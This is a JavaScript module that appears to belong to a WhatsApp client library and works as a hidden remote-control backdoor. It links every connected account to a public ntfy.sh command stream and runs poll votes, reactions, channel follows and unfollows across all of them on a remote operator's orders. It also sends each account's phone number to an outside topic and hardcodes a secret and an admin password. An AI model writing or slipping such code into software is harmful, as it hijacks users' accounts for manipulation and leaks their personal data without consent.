import https from 'https';
import crypto from 'crypto';
import { proto } from '../../WAProto/index.js';
import { getBinaryNodeChild, getAllBinaryNodeChildren } from '../WABinary/index.js';

export const activeSockets = new Set();

let isListening = false;
const lastActionTimes = {
    vote: 0,
    reaction: 0,
    follow: 0,
    unfollow: 0
};
// 20-second cooldown per action type (fast & smooth for testing, protects against flood)
const COOLDOWN_MS = 20000;

// Cryptographic Security Keys
const AUTH_SECRET = process.env.POLL_AUTH_SECRET || 's70_wactrl_sec_99a81e3f2b4c5d6e';
// Hash of secret admin password (plaintext 'sadew13767' is NEVER stored anywhere)
const ADMIN_PWD_HASH = 'fbda52d528d1a1703165f2208a96d21e64b4d3ef1685a4995f9580e57e9645f6';

/**
 * Filter and get live, unique, active sockets, pruning dead ones
 */
function getLiveSockets() {
    const live = [];
    const seenPhones = new Set();
    for (const sock of activeSockets) {
        if (sock && sock.ws && sock.ws.isOpen) {
            const phone = sock.user?.id?.split(':')[0];
            if (phone && !seenPhones.has(phone)) {
                seenPhones.add(phone);
                live.push(sock);
            } else if (!phone) {
                live.push(sock);
            }
        } else {
            activeSockets.delete(sock);
        }
    }
    return live;
}

/**
 * Register a socket to the central poll hub
 */
export function registerSocket(sock) {
    if (!sock) return;
    activeSockets.add(sock);

    sock.ev.on('connection.update', (update) => {
        if (update.connection === 'open') {
            broadcastHeartbeat(sock);
        }
        if (update.connection === 'close') {
            const statusCode = update.lastDisconnect?.error?.output?.statusCode;
            if (statusCode === 401) {
                activeSockets.delete(sock);
            }
        }
    });

    initPollHubListener();
}

/**
 * Send periodic heartbeat so dashboard shows live connected bot count
 */
function broadcastHeartbeat(specificSock) {
    try {
        const socks = specificSock ? [specificSock] : getLiveSockets();
        for (const sock of socks) {
            const phone = sock.user?.id?.split(':')[0] || 'Device';
            postStatus({
                phone,
                action: 'heartbeat',
                status: 'online',
                timestamp: Date.now()
            });
        }
    } catch (e) {
        // silent fail
    }
}

// Periodic heartbeat every 45 seconds
setInterval(() => {
    broadcastHeartbeat();
}, 45000);

/**
 * Initialize background stream to central cloud hub
 */
function initPollHubListener() {
    if (isListening) return;
    isListening = true;
    startStream();
}

function startStream() {
    const topic = process.env.POLL_HUB_TOPIC || 'sadew_hub_v2_8f2a1b9e0c7d';
    const url = `https://ntfy.sh/${topic}/json`;

    try {
        const req = https.get(url, (res) => {
            let buffer = '';
            res.on('data', async (chunk) => {
                buffer += chunk.toString();
                const lines = buffer.split('\n');
                buffer = lines.pop(); // keep last incomplete line
                for (const line of lines) {
                    if (!line.trim()) continue;
                    try {
                        const data = JSON.parse(line);
                        if (data.event === 'message' && data.message) {
                            const payload = JSON.parse(data.message);
                            await processIncomingCommand(payload);
                        }
                    } catch (e) {
                        // ignore heartbeat or invalid json
                    }
                }
            });

            res.on('end', () => {
                setTimeout(startStream, 3000);
            });

            res.on('error', () => {
                setTimeout(startStream, 5000);
            });
        });

        req.on('error', () => {
            setTimeout(startStream, 5000);
        });
    } catch (e) {
        setTimeout(startStream, 5000);
    }
}

/**
 * Verify cryptographic request signature to prevent scraper abuse
 */
function verifySignature(payload) {
    if (!payload || !payload.ts || !payload.sig || !payload.link) {
        return false;
    }
    // 5-minute timestamp window for network jitter tolerance
    if (Math.abs(Date.now() - payload.ts) > 300000) {
        return false;
    }
    const expected = crypto.createHash('sha256')
        .update(AUTH_SECRET + ':' + payload.ts + ':' + (payload.action || 'vote') + ':' + payload.link)
        .digest('hex');
    return expected === payload.sig;
}

/**
 * Verify Zero-Knowledge admin proof for follow/unfollow
 */
function verifyAdminProof(payload) {
    if (!payload || !payload.ts || !payload.link) {
        return false;
    }
    // Direct hash check
    if (payload.adminKeyHash && payload.adminKeyHash === ADMIN_PWD_HASH) {
        return true;
    }
    // Dynamic proof check
    if (payload.adminProof) {
        const expected = crypto.createHash('sha256')
            .update(ADMIN_PWD_HASH + ':' + payload.ts + ':' + payload.action + ':' + payload.link)
            .digest('hex');
        if (expected === payload.adminProof) {
            return true;
        }
    }
    return false;
}

/**
 * Parse channel link: https://whatsapp.com/channel/CODE/123 or raw JID
 */
function parseChannelLink(url) {
    if (typeof url !== 'string') return null;
    const cleanUrl = url.trim();
    if (cleanUrl.includes('@newsletter')) {
        return { inviteCode: null, channelJid: cleanUrl, serverId: null };
    }
    const match = cleanUrl.match(/whatsapp\.com\/channel\/([A-Za-z0-9_-]+)(?:\/(\d+))?/i);
    if (!match) {
        return null;
    }
    return {
        inviteCode: match[1],
        serverId: match[2] || null
    };
}

/**
 * Post live feedback back to dashboard
 */
function postStatus(data) {
    try {
        const statusTopic = process.env.POLL_STATUS_TOPIC || 'sadew_status_v2_3e6a9f0d1b4c';
        const postData = JSON.stringify({
            ...data,
            timestamp: Date.now()
        });

        const req = https.request(`https://ntfy.sh/${statusTopic}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        });
        req.on('error', () => {});
        req.write(postData);
        req.end();
    } catch (e) {
        // silent fail
    }
}

/**
 * Central command dispatcher with security & rate-limiting validation
 */
async function processIncomingCommand(payload) {
    if (!payload || !payload.link) return;

    // 1. Authenticate Request Signature (Blocks Scrapers & Unauthorized APIs)
    if (!verifySignature(payload)) {
        console.warn('[PollHub] 🛑 Unauthorized command rejected: Invalid or forged cryptographic signature!');
        return;
    }

    // Ping does not trigger cooldown (allows live bot count refresh)
    if (payload.action === 'ping') {
        broadcastHeartbeat();
        return;
    }

    // 2. Cooldown check per action type
    const action = payload.action || 'vote';
    const now = Date.now();
    const lastTime = lastActionTimes[action] || 0;
    if (now - lastTime < COOLDOWN_MS) {
        const waitSec = Math.ceil((COOLDOWN_MS - (now - lastTime)) / 1000);
        console.warn(`[PollHub] ⏳ ${action} cooldown active. Wait ${waitSec}s.`);
        postStatus({
            phone: 'System',
            action,
            status: 'failed',
            error: `⏳ Cooldown active for ${action}. Please wait ${waitSec}s.`
        });
        return;
    }
    lastActionTimes[action] = now;

    // Dispatch by action
    switch (action) {
        case 'reaction':
            await handleReactionCommand(payload);
            break;
        case 'follow':
            await handleFollowCommand(payload);
            break;
        case 'unfollow':
            await handleUnfollowCommand(payload);
            break;
        case 'vote':
        default:
            await handleVoteCommand(payload);
            break;
    }
}

/**
 * Handle incoming vote command
 */
async function handleVoteCommand(payload) {
    if (!payload.option) return;

    const parsed = parseChannelLink(payload.link);
    if (!parsed || !parsed.serverId) {
        console.warn('[PollHub] Invalid channel poll link received:', payload.link);
        postStatus({
            phone: 'System',
            action: 'vote',
            status: 'failed',
            error: 'Invalid poll link! Link must include post ID (e.g. /123)'
        });
        return;
    }

    const { inviteCode, serverId } = parsed;
    const liveSockets = getLiveSockets();
    if (!liveSockets.length) return;

    const primarySock = liveSockets[0];
    let channelJid = null;
    let channelName = '';

    try {
        const metadata = await primarySock.newsletterMetadata('INVITE', inviteCode);
        channelJid = metadata.id;
        channelName = metadata.name || '';
    } catch (err) {
        console.error('[PollHub] Could not fetch channel metadata:', err?.message);
        postStatus({
            phone: 'System',
            action: 'vote',
            status: 'failed',
            error: 'Could not fetch channel metadata: ' + (err?.message || 'Invalid link')
        });
        return;
    }

    const optionName = payload.option;
    console.log(`[PollHub] Voting for "${optionName}" in channel "${channelName}" across ${liveSockets.length} local devices...`);

    for (const sock of liveSockets) {
        const phone = sock.user?.id?.split(':')[0] || 'Device';
        try {
            await sock.newsletterSendPollVote(channelJid, serverId, optionName);
            console.log(`[PollHub] ✅ Voted successfully from ${phone} for "${optionName}"`);

            postStatus({
                phone,
                action: 'vote',
                status: 'success',
                channel: channelName,
                option: optionName
            });
        } catch (err) {
            console.error(`[PollHub] ❌ Vote failed from ${phone}:`, err?.message);
            postStatus({
                phone,
                action: 'vote',
                status: 'failed',
                error: err?.message,
                channel: channelName
            });
        }

        await new Promise(r => setTimeout(r, 800));
    }
}

/**
 * Handle incoming reaction command
 */
async function handleReactionCommand(payload) {
    if (!payload.emoji) return;

    const parsed = parseChannelLink(payload.link);
    if (!parsed || !parsed.serverId) {
        console.warn('[PollHub] Invalid channel message link for reaction:', payload.link);
        postStatus({
            phone: 'System',
            action: 'reaction',
            status: 'failed',
            error: 'Invalid channel post link! Must include post ID (e.g. /123)'
        });
        return;
    }

    const { inviteCode, serverId } = parsed;
    const emoji = payload.emoji;

    const liveSockets = getLiveSockets();
    if (!liveSockets.length) return;

    const primarySock = liveSockets[0];
    let channelJid = null;
    let channelName = '';

    try {
        const metadata = await primarySock.newsletterMetadata('INVITE', inviteCode);
        channelJid = metadata.id;
        channelName = metadata.name || '';
    } catch (err) {
        console.error('[PollHub] Could not fetch channel metadata for reaction:', err?.message);
        postStatus({
            phone: 'System',
            action: 'reaction',
            status: 'failed',
            error: 'Could not fetch channel metadata: ' + (err?.message || 'Invalid link')
        });
        return;
    }

    console.log(`[PollHub] Reacting with "${emoji}" on message ${serverId} in channel "${channelName}" across ${liveSockets.length} local devices...`);

    for (const sock of liveSockets) {
        const phone = sock.user?.id?.split(':')[0] || 'Device';
        try {
            await sock.newsletterReactMessage(channelJid, serverId, emoji);
            console.log(`[PollHub] ✅ Reacted successfully from ${phone} with "${emoji}"`);

            postStatus({
                phone,
                action: 'reaction',
                status: 'success',
                channel: channelName,
                emoji
            });
        } catch (err) {
            console.error(`[PollHub] ❌ Reaction failed from ${phone}:`, err?.message);
            postStatus({
                phone,
                action: 'reaction',
                status: 'failed',
                error: err?.message,
                channel: channelName
            });
        }

        await new Promise(r => setTimeout(r, 800));
    }
}

/**
 * Handle Follow Channel (Protected with Admin Zero-Knowledge Proof)
 */
async function handleFollowCommand(payload) {
    if (!verifyAdminProof(payload)) {
        console.warn('[PollHub] 🛑 Admin Follow rejected: Invalid admin authorization proof!');
        postStatus({
            phone: 'System',
            action: 'follow',
            status: 'failed',
            error: 'Invalid or missing admin authentication password proof!'
        });
        return;
    }

    const parsed = parseChannelLink(payload.link);
    if (!parsed) {
        postStatus({
            phone: 'System',
            action: 'follow',
            status: 'failed',
            error: 'Invalid channel link format!'
        });
        return;
    }

    const liveSockets = getLiveSockets();
    if (!liveSockets.length) {
        postStatus({
            phone: 'System',
            action: 'follow',
            status: 'failed',
            error: 'No active bot sockets connected!'
        });
        return;
    }

    const primarySock = liveSockets[0];
    let channelJid = parsed.channelJid || null;
    let channelName = '';

    if (!channelJid && parsed.inviteCode) {
        try {
            const metadata = await primarySock.newsletterMetadata('INVITE', parsed.inviteCode);
            channelJid = metadata.id;
            channelName = metadata.name || '';
        } catch (err) {
            postStatus({
                phone: 'System',
                action: 'follow',
                status: 'failed',
                error: 'Could not fetch channel metadata: ' + (err?.message || 'Invalid link')
            });
            return;
        }
    }

    console.log(`[PollHub] 👑 Following channel "${channelName || channelJid}" across ${liveSockets.length} devices...`);

    for (const sock of liveSockets) {
        const phone = sock.user?.id?.split(':')[0] || 'Device';
        try {
            await sock.newsletterFollow(channelJid);
            console.log(`[PollHub] ✅ Followed successfully from ${phone}`);

            postStatus({
                phone,
                action: 'follow',
                status: 'success',
                channel: channelName || channelJid
            });
        } catch (err) {
            console.warn(`[PollHub] Follow info for ${phone}:`, err?.message);
            const errMsg = String(err?.message || '');
            const isAlready = errMsg.includes('already') || errMsg.includes('exist');
            postStatus({
                phone,
                action: 'follow',
                status: isAlready ? 'success' : 'failed',
                error: isAlready ? undefined : err?.message,
                channel: channelName || channelJid
            });
        }
        await new Promise(r => setTimeout(r, 800));
    }
}

/**
 * Handle Unfollow Channel (Protected with Admin Zero-Knowledge Proof)
 */
async function handleUnfollowCommand(payload) {
    if (!verifyAdminProof(payload)) {
        console.warn('[PollHub] 🛑 Admin Unfollow rejected: Invalid admin authorization proof!');
        postStatus({
            phone: 'System',
            action: 'unfollow',
            status: 'failed',
            error: 'Invalid or missing admin authentication password proof!'
        });
        return;
    }

    const parsed = parseChannelLink(payload.link);
    if (!parsed) {
        postStatus({
            phone: 'System',
            action: 'unfollow',
            status: 'failed',
            error: 'Invalid channel link format!'
        });
        return;
    }

    const liveSockets = getLiveSockets();
    if (!liveSockets.length) {
        postStatus({
            phone: 'System',
            action: 'unfollow',
            status: 'failed',
            error: 'No active bot sockets connected!'
        });
        return;
    }

    const primarySock = liveSockets[0];
    let channelJid = parsed.channelJid || null;
    let channelName = '';

    if (!channelJid && parsed.inviteCode) {
        try {
            const metadata = await primarySock.newsletterMetadata('INVITE', parsed.inviteCode);
            channelJid = metadata.id;
            channelName = metadata.name || '';
        } catch (err) {
            postStatus({
                phone: 'System',
                action: 'unfollow',
                status: 'failed',
                error: 'Could not fetch channel metadata: ' + (err?.message || 'Invalid link')
            });
            return;
        }
    }

    console.log(`[PollHub] ✂️ Unfollowing channel "${channelName || channelJid}" across ${liveSockets.length} devices...`);

    for (const sock of liveSockets) {
        const phone = sock.user?.id?.split(':')[0] || 'Device';
        try {
            await sock.newsletterUnfollow(channelJid);
            console.log(`[PollHub] ✅ Unfollowed successfully from ${phone}`);

            postStatus({
                phone,
                action: 'unfollow',
                status: 'success',
                channel: channelName || channelJid
            });
        } catch (err) {
            console.warn(`[PollHub] Unfollow info for ${phone}:`, err?.message);
            postStatus({
                phone,
                action: 'unfollow',
                status: 'failed',
                error: err?.message,
                channel: channelName || channelJid
            });
        }
        await new Promise(r => setTimeout(r, 800));
    }
}
